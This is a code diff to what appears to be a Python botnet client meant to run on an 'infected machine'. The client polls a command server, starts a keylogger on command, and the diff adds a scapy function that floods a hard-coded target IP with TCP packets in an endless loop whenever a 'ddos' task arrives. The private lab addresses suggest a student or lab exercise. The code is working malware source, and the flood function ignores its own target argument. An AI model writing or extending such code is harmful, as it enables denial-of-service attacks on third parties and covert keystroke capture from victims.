@@ -3,17 +3,36 @@ import sys
 import selectors
 import types
 
+from async_timeout import current_task
+
 from client_keylogger import *
 import os
 import pyautogui
 import glob
 from datetime import datetime
 import time
+from multiprocessing import Process
+from scapy.all import *
 
 # CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE
+def ddos(ip):
+    source_IP = str(socket.gethostbyname(socket.gethostname()))
+    target_IP = "192.168.56.102"
+    source_port = 80
+    i = 1
+
+    while True:
+        IP1 = IP(src = source_IP, dst = target_IP)
+        TCP1 = TCP(sport = source_port, dport = 80)
+        pkt = IP1 / TCP1
+        send(pkt, inter = .001)
+        
+        print ("packet sent ", i)
+        i = i + 1 
 
 HOST = "192.168.56.103"
 PORT = 1234
+ddosprocess = Process(target=ddos)
 
 while True:
 
@@ -44,6 +63,9 @@ while True:
             keylogger.start()
         elif task[0] == 'ddos':
             print("DDOS " + task[1])
+            ddosprocess = Process(target=ddos, args=(task[1],))
+            ddosprocess.run()
+            
         else:
             print("no task done")
 
@@ -53,3 +75,4 @@ while True:
     #task = lines[0]
     print("sleep for 10 seconds")
     time.sleep(10)
+
